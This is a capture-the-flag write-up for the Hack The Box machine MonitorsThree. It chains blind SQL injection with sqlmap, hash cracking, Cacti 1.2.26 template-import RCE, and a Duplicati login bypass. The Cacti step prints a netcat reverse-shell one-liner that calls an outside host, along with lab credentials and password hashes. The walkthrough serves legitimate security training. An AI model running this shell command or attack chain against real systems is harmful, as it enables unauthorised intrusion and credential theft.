---
layout: post
title: "MonitorsThree"
date: 2024-10-04 10:04:00 +0000
categories: Writeup
---
MonitorsThree Writeup by <span style="color:yellow">jest</span>.

# Scan

```
Nmap scan report for 10.10.11.30
Host is up (0.025s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
| ssh-hostkey:
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

&nbsp;

# SQL Injection

There is SQL injection on the forgot password page on the monitorsthree site.:

![image](https://github.com/user-attachments/assets/a4fae5cc-f532-49bb-8228-d0d3068cd8f1)

Verified with the input '.

It looks to be blind.

I captured the request sent via burpsuite and put it into a txt file, then used sqlmap to dump the contents of the database:

![image](https://github.com/user-attachments/assets/406a8e21-219c-4911-a3a6-319dfd25b8ea)


This allowed me to acquire 4 hashes:

```
sqlmap -r post.txt --dump
```

```
dthompson@monitorsthree.htb:633b683cc128fe244b00f176c8a950f5
janderson@monitorsthree.htb:1e68b6eb86b45f6d92f8f292428f77ac
mwatson@monitorsthree.htb:c585d01f2eb3e6e1073e92023088a3dd
admin@monitorsthree.htb:31a181c8372e3afc59dab863430610e8
```

We can try cracking the admin@monitorsthree credential:
```sh
hashcat -m 0 -a 0 31a181c8372e3afc59dab863430610e8 /usr/share/wordlists/rockyou.txt
```
This will provide a password.

&nbsp;

# Cacti

I found a cacti subdomain:

![image](https://github.com/user-attachments/assets/027392ce-169d-4c77-88b8-8cf7f41c7102)

Add this to /etc/hosts.

We now have access to cacti with the admin credentials:

![image](https://github.com/user-attachments/assets/380380ca-0ca6-44a3-8da8-23b43181b2a3)


Cacti 1.2.26 suffers from rce via import template.

Cacti doesn't validate file names given through the package import feature, allowing it to write files onto the system or overwrite existing fils(even outside the cacti base path, as path traversal isn't filtered).

More can be found <a href="https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88">here.</a>

I used an automated attack found <a href="https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26">here.</a>

```python
my-venv/bin/python3 CVE-2024-25641.py \
    --user admin \
    --pass greencacti2001 \
    --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 666 >/tmp/f" \
    http://cacti.monitorsthree.htb/cacti/
```
After setting up a listener, this provides access to www-data on the machine.

Since cacti is in use, I enumerated that the credentials for the sql database were just the default cactiuser:cactiuser, so I could login and list the user hashes:

![image](https://github.com/user-attachments/assets/11e6e028-bacf-4c58-821e-94eb4945e8e2)

After cracking using hashcat, I can login as marcus via su:

![image](https://github.com/user-attachments/assets/91bc6910-641f-4d47-a441-ff2061cc073e)

&nbsp;

# Privilege Escalation

With a shell as marcus, I have to enumerate what this user can actually do.

I added my public key to the authorized key file and accessed the machine, whilst port forwarding 8200 on the box to port 8200 on my local machine.

I believe the path to root is related to duplicati backups, meaning we must crack the duplicati web ui shown on 8200 so we can access them.

There is a login bypass method <a href="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee">here.</a>

We need to find and move sqlite files on the box to our machine so we can access the contents using sqlite browser, which we can then use to obtain the server passphrase.

![image](https://github.com/user-attachments/assets/5c0d0787-e45a-49b1-b7aa-6831c5e665c)

We can see that the above matches when attempting to login then examining our burpsuite history:

![image](https://github.com/user-attachments/assets/e0c87262-9259-43e1-b21d-3c1e32a805ae)

Now we know it matches due to the salt being the same, we need the passhprase to generate a valid login password, using the nonce provided by the server:

![image](https://github.com/user-attachments/assets/64646c82-5967-43a4-9780-dfd3e42f8dbd)

The first string shown above is the session_nonce given whenever a session is established, whilst the second is the passphrase from the sqlite database decoded from base64 then converted to hex, resulting in our password below. This is code duplicati uses to generate the noncedpwd, so we can use it to get our own valid credential with the knowledge from sqlite.

We can change the burpsuite password parameter in that session to the one we just generated and gain access to duplicati:

![image](https://github.com/user-attachments/assets/e46e6f8b-2417-4653-a6b0-0195665a12e1)





